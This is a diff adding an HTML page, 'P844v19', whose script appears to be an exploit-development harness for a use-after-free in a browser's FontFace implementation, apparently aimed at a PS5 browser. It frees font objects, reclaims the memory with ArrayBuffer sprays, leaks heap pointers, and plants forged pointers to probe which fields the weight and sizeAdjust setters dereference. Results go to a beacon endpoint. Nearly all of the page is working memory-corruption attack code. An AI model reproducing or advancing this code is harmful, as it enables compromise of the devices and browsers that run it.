@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v19</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+var KEY='p844v19_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+var testNum=getTest();
+log('P844v19 BOOT test='+testNum);
+bn('P844v19-BOOT','test='+testNum);
+
+function doUAF(id,cb){
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:'UAF"+id+"';src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var face=new FontFace('UAF'+id+'F',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(face);void face.loaded;
+  var fabs=[],ffired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){if(ffired)return undefined;ffired=true;
+      st.remove();st.textContent='';st=null;
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em UAF'+id+'F,UAF'+id,'AB').then(function(){}).catch(function(){});
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var hi=-1,bv=null;
+    for(var i=0;i<fabs.length;i++){var t=new BigUint64Array(fabs[i]);if(t[0]!==0n||t[11]!==0n){hi=i;bv=t;break;}}
+    cb(bv?{abs:fabs,bv:bv,face:face,hitIdx:hi}:null);
+  },800);
+}
+function fin(tag,data){bn(tag,data);log(tag.replace('P844v19-','')+': '+data);setTimeout(function(){location.reload();},100);}
+
+function snapAll(ab){var u=new Uint8Array(ab);var s=new Uint8Array(192);for(var i=0;i<192;i++)s[i]=u[i];return s;}
+function diffSnap(before,after){
+  var ch=[];
+  for(var i=0;i<192;i++){
+    if(before[i]!==after[i])ch.push('+'+i+'=0x'+before[i].toString(16)+'->0x'+after[i].toString(16));
+  }
+  return ch.length?ch.join(','):'none';
+}
+
+var TESTS=[
+
+// ============================================================
+// PHASE A: Weight setter crash isolation
+// Goal: find which qword offset the setter reads as a pointer
+// ============================================================
+
+// T0: ALL ZERO except q0=gate — if crash = setter reads from AB (NULL deref)
+// if survive = setter doesn't actually read from AB (unlikely given v18 crash)
+function(){
+  setTest(1);
+  doUAF('T0',function(r){
+    if(!r)return fin('P844v19-T0-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    // Gate ON + all zeros
+    bv[0]=0x100000001n;
+    for(var i=1;i<24;i++)bv[i]=0n;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T0-OK','allzero|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// T1: q1 ONLY = self, rest zero — test if q1 is the critical pointer
+function(){
+  setTest(2);
+  doUAF('T1',function(r){
+    if(!r)return fin('P844v19-T1-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    bv[1]=self; // q1 only
+    for(var i=2;i<24;i++)bv[i]=0n;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T1-OK','q1only|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// T2: q1+q2 = self, rest zero
+function(){
+  setTest(3);
+  doUAF('T2',function(r){
+    if(!r)return fin('P844v19-T2-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    bv[1]=self;bv[2]=self;
+    for(var i=3;i<24;i++)bv[i]=0n;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T2-OK','q1q2|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// T3: q1+q2+q3 = self, rest zero
+function(){
+  setTest(4);
+  doUAF('T3',function(r){
+    if(!r)return fin('P844v19-T3-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    bv[1]=self;bv[2]=self;bv[3]=self;
+    for(var i=4;i<24;i++)bv[i]=0n;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T3-OK','q1q2q3|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// T4: q1-q4 = self, rest zero
+function(){
+  setTest(5);
+  doUAF('T4',function(r){
+    if(!r)return fin('P844v19-T4-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    for(var i=1;i<=4;i++)bv[i]=self;
+    for(var i=5;i<24;i++)bv[i]=0n;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T4-OK','q1to4|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// T5: q1-q6 = self, rest zero
+function(){
+  setTest(6);
+  doUAF('T5',function(r){
+    if(!r)return fin('P844v19-T5-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    for(var i=1;i<=6;i++)bv[i]=self;
+    for(var i=7;i<24;i++)bv[i]=0n;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T5-OK','q1to6|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// T6: q1-q8 = self, rest zero
+function(){
+  setTest(7);
+  doUAF('T6',function(r){
+    if(!r)return fin('P844v19-T6-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    for(var i=1;i<=8;i++)bv[i]=self;
+    for(var i=9;i<24;i++)bv[i]=0n;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T6-OK','q1to8|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// T7: q1-q12 = self, rest zero
+function(){
+  setTest(8);
+  doUAF('T7',function(r){
+    if(!r)return fin('P844v19-T7-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    for(var i=1;i<=12;i++)bv[i]=self;
+    for(var i=13;i<24;i++)bv[i]=0n;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T7-OK','q1to12|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// T8: ALL self (same as v18 T2 that crashed — reproducer)
+function(){
+  setTest(9);
+  doUAF('T8',function(r){
+    if(!r)return fin('P844v19-T8-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    for(var i=1;i<24;i++)bv[i]=self;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T8-OK','allself|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// ============================================================
+// PHASE B: sizeAdjust setter (DISCOVERED in v18 T12 proto enum!)
+// ============================================================
+
+// T9: face.sizeAdjust setter test
+function(){
+  setTest(10);
+  doUAF('T9',function(r){
+    if(!r)return fin('P844v19-T9-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    for(var i=1;i<24;i++)bv[i]=self;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.sizeAdjust='120%';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    // Read back
+    var rb='?';
+    try{rb=r.face.sizeAdjust;}catch(e){rb='ERR';}
+    fin('P844v19-T9-OK','setter=sizeAdjust|err='+(err||'none')+'|diff='+diff+'|rb='+rb+'|self=0x'+self.toString(16));
+  });
+},
+
+// T10: sizeAdjust with all zero (except gate)
+function(){
+  setTest(11);
+  doUAF('T10',function(r){
+    if(!r)return fin('P844v19-T10-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    for(var i=1;i<24;i++)bv[i]=0n;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.sizeAdjust='120%';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T10-OK','sizeAdjust_allzero|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// ============================================================
+// PHASE C: DUAL UAF — redirect weight setter target to AB2
+// If we survive with AB2 taking the hit, check for WRITES
+// ============================================================
+
+// T11: Dual UAF, weight setter with q1→AB2 (AB2 all self2)
+function(){
+  setTest(12);
+  doUAF('X',function(r1){
+    if(!r1)return fin('P844v19-T11-OK','uaf1=miss');
+    var self1=r1.bv[11]-0x58n;
+    doUAF('Y',function(r2){
+      if(!r2)return fin('P844v19-T11-OK','uaf2=miss|s1=0x'+self1.toString(16));
+      var self2=r2.bv[11]-0x58n;
+      // AB2: gate + self-referential
+      r2.bv[0]=0x100000001n;
+      for(var i=1;i<24;i++)r2.bv[i]=self2;
+      // AB1: gate + q1→AB2, rest=self1
+      r1.bv[0]=0x100000001n;
+      r1.bv[1]=self2; // redirect q1 to AB2
+      for(var i=2;i<24;i++)r1.bv[i]=self1;
+      var snap2=snapAll(r2.abs[r2.hitIdx]);
+      var err='';
+      try{r1.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+      var diff2=diffSnap(snap2,new Uint8Array(r2.abs[r2.hitIdx]));
+      fin('P844v19-T11-OK','dualQ1|err='+(err||'none')+'|diff2='+diff2+'|s1=0x'+self1.toString(16)+'|s2=0x'+self2.toString(16));
+    });
+  });
+},
+
+// T12: Dual UAF, weight setter with q2→AB2
+function(){
+  setTest(13);
+  doUAF('Z',function(r1){
+    if(!r1)return fin('P844v19-T12-OK','uaf1=miss');
+    var self1=r1.bv[11]-0x58n;
+    doUAF('W',function(r2){
+      if(!r2)return fin('P844v19-T12-OK','uaf2=miss|s1=0x'+self1.toString(16));
+      var self2=r2.bv[11]-0x58n;
+      r2.bv[0]=0x100000001n;
+      for(var i=1;i<24;i++)r2.bv[i]=self2;
+      // AB1: gate + q2→AB2, rest=self1
+      r1.bv[0]=0x100000001n;
+      r1.bv[1]=self1;
+      r1.bv[2]=self2; // redirect q2 to AB2
+      for(var i=3;i<24;i++)r1.bv[i]=self1;
+      var snap2=snapAll(r2.abs[r2.hitIdx]);
+      var err='';
+      try{r1.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+      var diff2=diffSnap(snap2,new Uint8Array(r2.abs[r2.hitIdx]));
+      fin('P844v19-T12-OK','dualQ2|err='+(err||'none')+'|diff2='+diff2+'|s1=0x'+self1.toString(16)+'|s2=0x'+self2.toString(16));
+    });
+  });
+},
+
+// T13: Dual UAF, weight setter with q3→AB2
+function(){
+  setTest(14);
+  doUAF('V',function(r1){
+    if(!r1)return fin('P844v19-T13-OK','uaf1=miss');
+    var self1=r1.bv[11]-0x58n;
+    doUAF('U',function(r2){
+      if(!r2)return fin('P844v19-T13-OK','uaf2=miss|s1=0x'+self1.toString(16));
+      var self2=r2.bv[11]-0x58n;
+      r2.bv[0]=0x100000001n;
+      for(var i=1;i<24;i++)r2.bv[i]=self2;
+      r1.bv[0]=0x100000001n;
+      r1.bv[1]=self1;r1.bv[2]=self1;
+      r1.bv[3]=self2; // redirect q3 to AB2
+      for(var i=4;i<24;i++)r1.bv[i]=self1;
+      var snap2=snapAll(r2.abs[r2.hitIdx]);
+      var err='';
+      try{r1.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
+      var diff2=diffSnap(snap2,new Uint8Array(r2.abs[r2.hitIdx]));
+      fin('P844v19-T13-OK','dualQ3|err='+(err||'none')+'|diff2='+diff2+'|s1=0x'+self1.toString(16)+'|s2=0x'+self2.toString(16));
+    });
+  });
+},
+
+// T14: Weight "normal" (different value, might take different code path)
+function(){
+  setTest(15);
+  doUAF('N',function(r){
+    if(!r)return fin('P844v19-T14-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    for(var i=1;i<24;i++)bv[i]=self;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='normal';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T14-OK','weight=normal|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+},
+
+// T15: Weight "400" (numeric value)
+function(){
+  setTest(16);
+  doUAF('M',function(r){
+    if(!r)return fin('P844v19-T15-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-0x58n;
+    bv[0]=0x100000001n;
+    for(var i=1;i<24;i++)bv[i]=self;
+    var snap=snapAll(r.abs[r.hitIdx]);
+    var err='';
+    try{r.face.weight='400';}catch(e){err=e.message.substring(0,60);}
+    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
+    fin('P844v19-T15-OK','weight=400|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
+  });
+}
+];
+
+var NAMES=['T0-weightAllZero','T1-weightQ1only','T2-weightQ1Q2','T3-weightQ1toQ3',
+  'T4-weightQ1toQ4','T5-weightQ1toQ6','T6-weightQ1toQ8','T7-weightQ1toQ12',
+  'T8-weightAllSelf','T9-sizeAdjust','T10-sizeAdjustZero',
+  'T11-dualQ1','T12-dualQ2','T13-dualQ3','T14-weightNormal','T15-weight400'];
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v19-DONE','all='+TESTS.length);
+    clearTest();return;
+  }
+  log('Running '+NAMES[testNum]+'...');
+  try{TESTS[testNum]();}catch(e){
+    bn('P844v19-'+NAMES[testNum]+'-ERR',e.message);
+    setTest(testNum+1);setTimeout(function(){location.reload();},100);
+  }
+}
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
